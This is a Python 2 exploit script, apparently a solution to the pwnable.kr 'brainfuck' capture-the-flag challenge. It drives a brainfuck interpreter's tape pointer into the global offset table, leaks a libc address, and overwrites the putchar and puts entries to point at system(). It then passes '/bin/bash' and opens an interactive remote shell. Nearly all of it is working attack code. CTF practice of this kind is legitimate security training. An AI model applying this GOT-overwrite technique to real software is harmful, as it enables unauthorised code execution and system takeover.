from time import sleep
import struct
import socket
#IP = '127.0.0.1'
IP = 'pwnable.kr'
PORT = 9001
__libc_start_main_got = 0x804A024
system_offset = 0x25e90
param_pool = 0x804a004
jumpto = 0x804a008
tape = 0x0804A0A0 # tape
p = 0x0804A0A0 # tape
puts_got = 0x804A018
fgets_got = 0x804A010
p_eax = 0x08048615
putchar_got = 0x804A030
call_putchar = 0x8048648
push_and_jump = 0x8048430

def interact(sock):
    while True:
        a = raw_input()
        if not a.endswith('\n'):
            a += '\n'
        sock.send(a)
        if a == 'exit\n':
            return
        sleep(1)
        buf = sock.recv(1024)
        print buf

def get_offset(a, b):
    if b > a:
        return '+' * (b-a)
    else:
        return '-' * (a-b)

def move(t):
    global p
    p0 = p
    p = t
    if t == p0:
        return ''
    if t > p0:
        return '>' * (t-p0)
    else:
        return '<' * (p0-t)

def walk(w):
    global p
    p1 = p + w
    return move(p1)

def readn(n):
    if n == 0:
        return ''
    res = ''
    for i in range(n-1):
        res += '.'+walk(1)
    res += '.'
    return res

def writen(n):
    if n == 0:
        return ''
    res = ''
    for i in range(n-1):
        res += ','+walk(1)
    res += ','
    return res

def slightly(s, t):
    if t == s:
        return ''
    if t > s:
        return '+'*(t-s)
    else:
        return '-'*(s-t)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))
raw_input('pause')
sleep(1)
sock.recv(1024)

# string bytes, stored in p[]
a = writen(10)

# FIRST, DIG HOLES (except for move %eax, it's real data))

# Read __libc_start_main_got, prepare for system addr
a += move(__libc_start_main_got)
a += readn(4)

# string pointer
a += move(param_pool)
a += writen(4)

# jump from push_and_jump to call_putchar
a += move(jumpto)
a += writen(4)

# modify putchar got to system
a += move(putchar_got)
a += writen(4)

# modify puts got to push_and_jump
a += move(puts_got)
a += writen(4)

# THIRD. FIRE UP!
# call fake puts
a += '['

print 'Send:', a
sock.send(a + '\n')

# Fill in string bytes
print 'Send:', map(hex,map(ord,'/bin/bash\x00'))
a = '/bin/bash'
sock.send(a + '\00')

# SECOND, FILL IN HOLES
sleep(1)
buf = sock.recv(1024)
print 'Recv:', buf
__libc_start_main = int(struct.unpack('<I', buf)[0])
system = __libc_start_main + system_offset

# Fill in tape & & push_and_call_fgets & tape
print 'Send:', hex(tape), hex(call_putchar), hex(system), hex(push_and_jump)
a = struct.pack('<I', tape) + struct.pack('<I', call_putchar) + struct.pack('<I', system) + struct.pack('<I', push_and_jump)
sock.send(a + '\n')

interact(sock)

sock.close()
